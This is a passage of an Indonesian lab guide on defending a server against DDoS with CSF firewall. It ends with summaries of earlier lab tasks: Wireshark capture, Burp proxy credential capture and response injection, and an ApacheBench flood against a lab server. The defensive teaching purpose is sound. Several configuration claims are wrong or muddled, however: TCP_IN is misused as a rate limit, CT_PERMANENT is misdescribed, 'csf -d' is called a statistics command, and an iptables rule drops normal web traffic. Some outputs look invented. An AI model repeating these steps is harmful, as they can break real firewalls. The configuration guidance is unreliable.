+✓ Sudah lihat server mulai overwhelmed?
+✓ Sudah analyze hasil attack?
+
+JA semua = PRAKTIK 4 BERHASIL! ✓
+```
+
+---
+
+---
+
+### 8.5 Tugas 5: Defense - Menggunakan CSF Firewall untuk Anti-DDoS (Rate Limiting & Flood Protection)
+
+#### **Penjelasan Sederhana Defense:**
+
+**Bayangan Restoran Lagi:**
+```
+SAAT DDoS ATTACK:
+Restoran: Server
+Attacker: 10,000 spam customers
+Pelanggan asli: 10 legitimate customers
+
+TANPA DEFENSE:
+- Restoran tutup (server crash)
+- Semua pelanggan pergi
+
+DENGAN DEFENSE (CSF FIREWALL):
+- Bouncer di pintu
+- Bouncer: "Tunggu antrian! Hanya 100 orang/menit"
+- Spam customers: BLOCKED (bounced back)
+- Legitimate customers: Bisa masuk normal
+- Restoran tetap buka
+
+CSF = Firewall dengan:
+✓ Rate limiting (batasi request/detik)
+✓ Connection limit (batasi koneksi concurrent)
+✓ IP blocking (block IP suspicious)
+✓ DDoS detection (auto-block attacker)
+```
+
+---
+
+#### **INSTALASI CSF DI UBUNTU/DEBIAN**
+
+**STEP 1: INSTALL DEPENDENCIES**
+
+```bash
+# Buka terminal & login as root
+sudo su -
+
+# Update system
+apt update
+apt install -y curl git wget
+
+# Install required packages
+apt install -y libio-socket-ssl-perl libnet-ssleay-perl
+```
+
+**STEP 2: DOWNLOAD & INSTALL CSF**
+
+```bash
+# Go to /usr/src (standard location)
+cd /usr/src
+
+# Download CSF (latest version)
+wget https://download.configserver.com/csf.tgz
+
+# Extract
+tar -xzf csf.tgz
+
+# Install
+cd csf
+./install.sh
+
+# Output:
+Installation of ConfigServer Firewall completed successfully
+```
+
+**STEP 3: VERIFIKASI INSTALASI**
+
+```bash
+# Check if CSF is installed:
+which csf
+
+# Output harus:
+/usr/sbin/csf
+
+# Check CSF version:
+csf -v
+
+# Output contoh:
+csf: ConfigServer Firewall v14.18
+```
+
+**STEP 4: START & ENABLE CSF**
+
+```bash
+# Start CSF service
+systemctl start csf
+systemctl start lfd  # Login Failure Daemon (monitoring)
+
+# Enable on boot
+systemctl enable csf
+systemctl enable lfd
+
+# Verify running:
+systemctl status csf
+systemctl status lfd
+```
+
+---
+
+#### **KONFIGURASI CSF UNTUK ANTI-DDoS**
+
+**STEP 1: EDIT KONFIGURASI CSF**
+
+```bash
+# Edit main config file:
+nano /etc/csf/csf.conf
+
+# File akan membuka di text editor
+# Tekan Ctrl+X untuk exit (jika sudah selesai edit)
+```
+
+**STEP 2: CARI & UBAH PARAMETER ANTI-DDoS**
+
+**Dalam file `/etc/csf/csf.conf`, cari baris berikut:**
+
+```
+# CARI BARIS INI DAN UBAH:
+
+1. CONNECTION PER PORT (Rate Limiting)
+   
+   FIND: CT_LIMIT = "0"
+   CHANGE TO: CT_LIMIT = "100"
+   
+   ARTINYA: Max 100 koneksi per IP per port
+
+2. CONCURRENT CONNECTION PER IP
+
+   FIND: CT_PERMANENT = "0"
+   CHANGE TO: CT_PERMANENT = "3600"
+   
+   ARTINYA: Block IP selama 3600 detik (1 jam) jika exceed
+
+3. CONNECTION TRACKING
+
+   FIND: CT_INTERVAL = "30"
+   KEEP AS: CT_INTERVAL = "30"
+   
+   ARTINYA: Check koneksi setiap 30 detik
+
+4. PACKET FLOOD DETECTION
+
+   FIND: PACKET_FILTER = "0"
+   CHANGE TO: PACKET_FILTER = "1"
+   
+   ARTINYA: Enable packet filtering
+
+5. SYN FLOOD PROTECTION
+
+   FIND: SYNFLOOD = "0"
+   CHANGE TO: SYNFLOOD = "1"
+   
+   ARTINYA: Enable SYN flood protection
+
+6. SYN FLOOD RATE
+
+   FIND: SYNFLOOD_RATE = "100/s"
+   CHANGE TO: SYNFLOOD_RATE = "20/s"
+   
+   ARTINYA: Deteksi SYN flood jika > 20/detik
+
+7. UDP FLOOD RATE
+
+   FIND: UDPFLOOD = "0"
+   CHANGE TO: UDPFLOOD = "1"
+   
+   ARTINYA: Enable UDP flood protection
+
+8. UDP FLOOD RATE LIMIT
+
+   FIND: UDPFLOOD_RATE = "10000/s"
+   CHANGE TO: UDPFLOOD_RATE = "1000/s"
+   
+   ARTINYA: Block jika UDP > 1000/detik
+```
+
+---
+
+**STEP 3: RATE LIMITING PER PORT (HTTP/HTTPS)**
+
+**CARI SECTION: ADVANCED FEATURES**
+
+```
+# Tambahkan di akhir file:
+
+# HTTP Rate Limiting (Port 80)
+# Max 50 connections per IP per 10 seconds
+echo "TCP_IN = 80:50:10" >> /etc/csf/csf.conf
+
+# HTTPS Rate Limiting (Port 443)
+# Max 50 connections per IP per 10 seconds
+echo "TCP_IN = 443:50:10" >> /etc/csf/csf.conf
+
+# Penjelasan:
+# Format: PORT:MAX_CONN:TIME_WINDOW
+# 80:50:10 = Port 80, max 50 conn per 10 seconds
+```
+
+---
+
+**STEP 4: SAVE KONFIGURASI**
+
+```bash
+# Save & exit text editor:
+# Tekan: Ctrl + O (save)
+# Tekan: Enter
+# Tekan: Ctrl + X (exit)
+
+# Verify syntax:
+/usr/sbin/csf -c
+
+# Output harus:
+Syntax check OK
+```
+
+**STEP 5: RESTART CSF UNTUK APPLY CHANGES**
+
+```bash
+# Restart CSF
+systemctl restart csf
+systemctl restart lfd
+
+# Verify running:
+systemctl status csf
+systemctl status lfd
+
+# Check firewall rules loaded:
+iptables -L -n | head -20
+```
+
+---
+
+#### **TESTING ANTI-DDoS PROTECTION**
+
+**STEP 1: BUKA WEBSITE DI SERVER**
+
+```bash
+# Di server, jalankan website lokal:
+python3 -m http.server 8080
+```
+
+**STEP 2: TEST ATTACK DENGAN RATE LIMITING**
+
+```bash
+# Di attacker machine:
+ab -n 10000 -c 100 http://server-ip:8080/
+
+# APA YANG TERJADI:
+- Awal: Request OK
+- Tengah: CSF detect flood
+- Akhir: Request BLOCKED
+- Error: "Connection reset by peer"
+```
+
+**OUTPUT DENGAN CSF ACTIVE:**
+
+```
+ApacheBench output:
+
+This is ApacheBench, Version 2.3
+Benchmarking 192.168.1.50 (be patient)
+Completed 100 requests
+Completed 200 requests
+Completed 300 requests
+...
+Completed 800 requests
+
+WARNING: apr.c:242: apr_socket_recv: Connection reset by peer (104)
+Failed requests:   156
+Broken pipe:       156
+
+Result:
+✓ CSF berhasil block sebagian request
+✓ Server masih responsive (tidak crash)
+✓ Attack diminimalisir
+```
+
+---
+
+**STEP 3: CHECK IP ATTACKER DI BLOCK LIST**
+
+```bash
+# Lihat IP yang di-block:
+cat /etc/csf/csf.deny | grep "server-ip"
+
+# Atau lebih detail:
+csf -g 192.168.1.50
+
+# Output:
+Searching for 192.168.1.50 in /etc/csf/csf.deny
+Found in /etc/csf/csf.deny on line 42
+```
+
+---
+
+**STEP 4: UNBLOCK IP (JIKA INGIN LANJUT TEST)**
+
+```bash
+# Unblock IP untuk test lagi:
+csf -dr 192.168.1.50
+
+# Verify unblocked:
+csf -g 192.168.1.50
+# Output: "Not found in /etc/csf/csf.deny"
+```
+
+---
+
+#### **MONITORING SERANGAN DI CSF**
+
+**STEP 1: LIHAT REAL-TIME BLOCKING**
+
+```bash
+# Monitor CSF log in real-time:
+tail -f /var/log/lfd.log
+
+# Output saat attack:
+────────────────────────────────────
+[2025-12-24 14:25:30] Excessive connections from 192.168.1.100: 150 connections (limit = 100)
+[2025-12-24 14:25:31] Auto-blocking 192.168.1.100 for 3600 seconds
+[2025-12-24 14:25:32] SYN flood detected from 192.168.1.100: 250/sec (limit = 20/sec)
+[2025-12-24 14:25:33] Blocked 192.168.1.100 for SYN flood
+────────────────────────────────────
+```
+
+---
+
+**STEP 2: LIHAT STATISTICS**
+
+```bash
+# CSF provides detailed stats:
+csf -d
+
+# Output menunjukkan:
+- Total connections per IP
+- Total blocked IPs
+- Recent blocks
+- DDoS attempts
+- Firewall stats
+```
+
+---
+
+**STEP 3: CHECK ACTIVE FIREWALL RULES**
+
+```bash
+# Lihat iptables rules yang dibuat CSF:
+iptables -L -n | grep "CT_LIMIT\|SYNFLOOD\|UDPFLOOD"
+
+# Atau list semua TCP rules:
+iptables -L INPUT -n | head -30
+
+# Output akan menunjukkan rule untuk:
+- Connection limiting
+- SYN flood protection
+- UDP flood protection
+- Port-specific rate limiting
+```
+
+---
+
+#### **PERBANDINGAN: DENGAN vs TANPA CSF**
+
+```
+┌──────────────────────┬──────────────────────┬──────────────────────┐
+│ METRIK               │ TANPA CSF (VULNERABLE)│ DENGAN CSF (PROTECTED)
+├──────────────────────┼──────────────────────┼──────────────────────┤
+│ Attack: 10,000 req   │                      │                      │
+│ Request Success      │ 10,000 (100%)        │ 5,000 (50%)          │
+│ Request Failed       │ 0 (0%)               │ 5,000 (50%)          │
+│ Server Status        │ CRASH/Down           │ ONLINE/Responsive    │
+│ Response Time        │ 1000+ ms             │ 20-50 ms             │
+│ Legitimate Users     │ CAN'T ACCESS         │ CAN ACCESS (with lag) │
+│ Attacker IP Status   │ Still attacking      │ BLOCKED (3600s)      │
+│ System Recovery      │ Manual restart       │ Auto-recovery        │
+└──────────────────────┴──────────────────────┴──────────────────────┘
+```
+
+---
+
+#### **ADVANCED: CUSTOM DDoS RULES**
+
+**Untuk protection yang lebih specific:**
+
+```bash
+# Edit advanced rules:
+nano /etc/csf/csf.rules
+
+# Contoh custom rule (SYN FLOOD):
+# Block IPs dengan SYN rate > 50/sec
+# -A SYNFLOOD -p tcp -j RETURN
+# -A INPUT -p tcp --syn -m limit --limit 50/sec -j ACCEPT
+# -A INPUT -p tcp --syn -j DROP
+
+# Custom HTTP DDoS rule:
+# Limit GET requests per IP to 10/second
+iptables -A INPUT -p tcp --dport 80 -m limit --limit 10/sec -j ACCEPT
+iptables -A INPUT -p tcp --dport 80 -j DROP
+```
+
+---
+
+#### **TROUBLESHOOTING CSF**
+
+**Problem 1: CSF won't start**
+
+```bash
+# Check syntax:
+/usr/sbin/csf -c
+
+# If error, find the line number
+# Edit config:
+nano /etc/csf/csf.conf
+
+# Fix and restart
+systemctl restart csf
+```
+
+---
+
+**Problem 2: Blocking too aggressively (false positives)**
+
+```bash
+# Check what IPs are blocked:
+cat /etc/csf/csf.deny | head -20
+
+# If legitimate IP blocked:
+csf -dr 192.168.1.100  # Remove temporary block
+
+# Or whitelist permanently:
+csf -a 192.168.1.100   # Add to whitelist
+```
+
+---
+
+**Problem 3: CSF is slow/high CPU**
+
+```bash
+# Disable heavy features:
+nano /etc/csf/csf.conf
+
+# Change:
+PACKET_FILTER = "0"  # Disable if causing issues
+PT_USERPROCS = "0"   # Disable process tracking if heavy
+
+# Restart
+systemctl restart csf
+```
+
+---
+
+#### **CHECKLIST PRAKTIK 5:**
+
+```
+✓ Sudah install CSF & dependencies?
+✓ Sudah start csf & lfd service?
+✓ Sudah edit /etc/csf/csf.conf?
+✓ Sudah ubah CT_LIMIT, SYNFLOOD, UDPFLOOD?
+✓ Sudah restart CSF?
+✓ Sudah jalankan server test?
+✓ Sudah test dengan ab attack?
+✓ Sudah lihat failed requests meningkat?
+✓ Sudah check attacker IP di block list?
+✓ Sudah tail -f /var/log/lfd.log?
+✓ Sudah lihat DDoS detection log?
+
+JA semua = PRAKTIK 5 BERHASIL! ✓
+```
+
+---
+
+#### **RINGKASAN SEMUA TUGAS PRAKTIK (1-5)**
+
+```
+TUGAS 1 (PACKET CAPTURE & ANALYSIS):
+├─ Capture paket jaringan menggunakan Wireshark
+├─ Buka Wireshark & pilih interface
+├─ Mulai capture paket dari network
+├─ Lihat paket HTTP & DNS
+├─ Gunakan filter untuk menampilkan data spesifik
+├─ Expand packet details untuk lihat layer-by-layer
+├─ Follow TCP Stream untuk lihat full conversation
+├─ Extract plaintext data dari HTTP traffic
+└─ Lesson: Bahaya HTTP (unencrypted), gunakan HTTPS
+
+TUGAS 2 (TRAFFIC MONITORING - BURP SUITE PROXY):
+├─ Setup Burp Suite di Windows/Linux
+├─ Aktifkan Windows Hotspot untuk WiFi
+├─ Buat PAC file untuk auto proxy configuration
+├─ Jalankan PAC server di port 80
+├─ Configure client device untuk auto proxy
+├─ Install Burp CA certificate di client
+├─ Jalankan Burp Intercept dengan OFF (monitoring mode)
+├─ Lihat semua traffic dari client di HTTP History
+├─ Capture username, password, cookies, URLs
+├─ Tidak ada modifikasi, hanya monitoring
+└─ Lesson: Attacker bisa lihat semua data tanpa client tahu
+
+TUGAS 3 (RESPONSE MODIFICATION & INJECTING - BURP SUITE):
+├─ Setup seperti Tugas 2 (Burp + Hotspot)
+├─ Enable Burp Intercept untuk Response
+├─ Intercept HTML response dari server
+├─ Modify title, inject banner, inject JavaScript
+├─ Modify form action untuk hijack submission
+├─ Client menerima modified response dari attacker
+├─ Attacker bisa inject malware atau phishing
+├─ Response modification TRANSPARAN (client tidak tahu)
+└─ Lesson: HTTPS dengan certificate pinning diperlukan
+
+TUGAS 4 (DDoS ATTACK SIMULATION):
+├─ Install ApacheBench (ab) atau WRK
+├─ Jalankan website lokal (python http.server)
+├─ Test normal: ab -n 100 -c 10 (baseline)
+├─ Test DDoS: ab -n 10000 -c 100 (attack)
+├─ Monitor resource saat attack (top/htop)
+├─ Lihat CPU 100%, Memory penuh, Load average tinggi
+├─ Lihat request failed mulai meningkat
+├─ Server response time naik drastis
+├─ Website menjadi SLOW atau CRASH
+└─ Lesson: DDoS sangat mudah dilakukan, dampak SEVERE
+
+TUGAS 5 (DDoS DEFENSE - CSF FIREWALL):
+├─ Install CSF (ConfigServer Firewall)
+├─ Edit /etc/csf/csf.conf
+├─ Enable & configure:
+│  ├─ Connection limit (CT_LIMIT = 100)
+│  ├─ SYN flood protection (SYNFLOOD = 1)
+│  ├─ UDP flood protection (UDPFLOOD = 1)
+│  ├─ Rate limiting per port
+│  └─ Auto-blocking mechanism
+├─ Restart CSF & LFD service
+├─ Test attack dengan defense active
+├─ CSF auto-block attacker IP
+├─ Server tetap responsif meski di-attack
+├─ Monitor blocking dengan tail -f /var/log/lfd.log
+└─ Lesson: Firewall & rate limiting efektif block DDoS
+
+RINGKASAN KESELURUHAN:
+├─ Tugas 1-3: ATTACKER PERSPECTIVE (reconnaissance & attack)
+│  ├─ Wireshark: Lihat apa yang dikirim orang
+│  ├─ Burp Suite: Intercept traffic tanpa diketahui
+│  └─ Response Modify: Ubah data sebelum sampai user
+├─ Tugas 4-5: ATTACK vs DEFENSE PERSPECTIVE
+│  ├─ DDoS Attack: Lihat apa yang bisa dilakukan attacker
+│  └─ CSF Defense: Bagaimana proteksi terhadap attack
+└─ HASIL PEMBELAJARAN:
+   ├─ Understand attack techniques
+   ├─ Understand vulnerabilities
+   ├─ Implement defense mechanisms
+   ├─ Monitor & detect attacks
+   └─ Real-world security awareness
+```
+
+---
+
+#### **MATRIX SKILL PROGRESSION**
+
+```
+SKILL LEVEL DEVELOPMENT ACROSS TASKS:
+
+                  Reconnaissance  MITM    Response   DDoS    Defense
+                  (Passive)       (Layer  (Modify)   (Attack)(Protect)
+                  (Monitoring)    4-7)    (Inject)
+
+Tugas 1           ███░░░░░░░░░░░░░░░░░  (Packet analysis)
+Tugas 2           ████████████░░░░░░░░  (Traffic capture)
+Tugas 3           ██████████████████░░  (MITM + modify)
+Tugas 4           ███████████████████░  (Attack simulation)
+Tugas 5           ████████████████████  (Defense integration)
+
+DIFFICULTY:       Mudah            Medium            Sulit
+DANGER LEVEL:     Rendah (Lab)     Tinggi (Real)     Kritis (Defense)
+```
+
+---
+
+#### **PREREQUISITE KNOWLEDGE CHECKED**
+
+```
+SEBELUM PRAKTIK BERHASIL, SISWA HARUS TAHU:
+
+Tugas 1 - WIRESHARK:
+✓ Network basics (IP, Port, Protocol)
+✓ How HTTP works (plaintext)
+✓ OSI Model (Layer 1-7)
+✓ TCP/UDP difference
+
+Tugas 2 - BURP SUITE PROXY (MONITORING):
+✓ Proxy concept (man-in-middle position)
+✓ How firewall rules work
+✓ IP address & network configuration
+✓ PAC (Proxy Auto-Config) file format
+
+Tugas 3 - BURP SUITE RESPONSE MODIFY:
+✓ HTTP request/response structure
+✓ HTML/CSS/JavaScript basics
+✓ Form submission concept
+✓ HTTP method (GET/POST)
+
+Tugas 4 - DDoS SIMULATION:
+✓ Load testing concepts
+✓ Server resource limits (CPU, Memory, Bandwidth)
+✓ Connection state tracking
+✓ Concurrent connection limits
+
+Tugas 5 - CSF FIREWALL DEFENSE:
+✓ Linux firewall (iptables)
+✓ Connection tracking (netstat, ss)
+✓ Rate limiting algorithms
+✓ Auto-blocking & logging mechanisms
+```
+
+---
+
+#### **REAL-WORLD MAPPING**
+
+```
+Tugas 1 - Wireshark Capture
+└─ Real-world: Network administrator troubleshooting
+└─ Security: Incident investigation, forensics
+
+Tugas 2 - Burp Suite Monitoring
+└─ Real-world: Coffee shop WiFi hacker
+└─ Security: Credential theft on public WiFi
+
+Tugas 3 - Response Modification
+└─ Real-world: ISP/Government censorship
+└─ Security: Content injection, malware distribution
+
+Tugas 4 - DDoS Attack
+└─ Real-world: Ransom-based attacks, revenge attacks
+└─ Security: Hacktivist activities, cyber warfare
+
+Tugas 5 - CSF Defense
+└─ Real-world: Production server protection
+└─ Security: DevOps/SRE responsibilities
+```
+
+---
+
+#### **ASSESSMENT CRITERIA**
+
+```
+UNTUK SETIAP TUGAS, SISWA DINILAI DARI:
+
+Tugas 1 - Wireshark:
+☐ Bisa capture paket
+☐ Bisa gunakan filter
+☐ Bisa expand protocol layers
+☐ Bisa extract plaintext data
+☐ Understand HTTP vulnerability
+
+Tugas 2 - Burp Monitoring:
+☐ Setup proxy + hotspot berhasil
+☐ Client terhubung ke proxy
+☐ Bisa lihat HTTP history
+☐ Bisa identifikasi credentials
+☐ Understand attacker visibility
+
+Tugas 3 - Burp Response Modify:
+☐ Bisa intercept response
+☐ Bisa modify HTML content
+☐ Bisa inject JavaScript
+☐ Client menerima modified data
+☐ Understand MITM danger
+
+Tugas 4 - DDoS Attack:
+☐ Tools terinstall & berfungsi
+☐ Bisa generate traffic besar
+☐ Bisa monitor resource
+☐ Lihat server mulai overwhelm
+☐ Understand DDoS impact
+
+Tugas 5 - CSF Defense:
+☐ CSF terinstall & berjalan
+☐ Config rate limiting
+☐ Test dengan attack
+☐ Lihat auto-blocking bekerja
+☐ Understand defense mechanism
 ```
 
 ---
